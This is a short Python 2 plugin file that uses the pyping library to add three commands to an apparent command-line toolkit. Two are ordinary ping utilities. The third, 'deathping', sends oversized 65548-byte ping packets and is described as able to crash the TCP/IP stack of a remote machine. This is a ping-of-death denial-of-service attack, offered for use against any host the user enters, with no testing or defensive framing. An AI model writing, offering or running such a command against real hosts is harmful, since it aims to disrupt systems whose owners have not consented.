import pyping

desc = 'uses python to ping IPs or websites (may require root access)'
author = 'nwx'
cmds = []

def ping():
	dest = raw_input('host? ')
	p = pyping.Ping(dest, timeout=1000, packet_size=55, own_id=None, quiet_output=False)
	p.run()
cmds.append(('ping','pings a host indefinitely',ping))

def longping():
	dest = raw_input('host? ')
	p = pyping.Ping(dest, timeout=100000, packet_size=55, own_id=None, quiet_output=False)
	p.run()
cmds.append(('longping','pings a host indefinitely with a generous timeout',longping))

def deathping():
	dest = raw_input('host? ')
	p = pyping.Ping(dest, timeout=1000, packet_size=65548, own_id=None, quiet_output=False)
	p.run()
cmds.append(('deathping','pings a host indefinitely with an invalid packet size that can crash the TCP/IP stack on the remote machine',deathping))
